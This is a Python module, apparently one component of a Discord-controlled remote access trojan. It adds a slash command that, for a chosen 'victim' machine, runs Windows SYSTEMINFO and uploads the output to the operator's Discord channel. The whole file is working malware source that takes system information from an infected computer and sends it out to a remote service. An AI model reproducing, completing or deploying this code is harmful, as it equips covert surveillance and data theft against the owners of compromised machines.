import disnake as discord
from disnake.ext import commands
from datetime import datetime
from io import BytesIO

import os, requests, subprocess
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class SytemInfo(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @commands.slash_command( )
    async def get_systeminfo(self, ctx, victim):
        """Sends General System Information

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) == str(self.bot.identifier):
            await ctx.response.defer()
            
            output = BytesIO(
                bytes(
                    os.popen("SYSTEMINFO").read(),
                    'utf-8'
                )
            )

            await ctx.followup.send(
                embed=self.bot.genEmbed(
                    "System Information:", 
                    datetime.now()
                ),
                file=discord.File(
                    output, 
                    filename="systeminfo.txt"
                ), 
            )

def setup(bot: commands.Bot):
    bot.add_cog(SytemInfo(bot))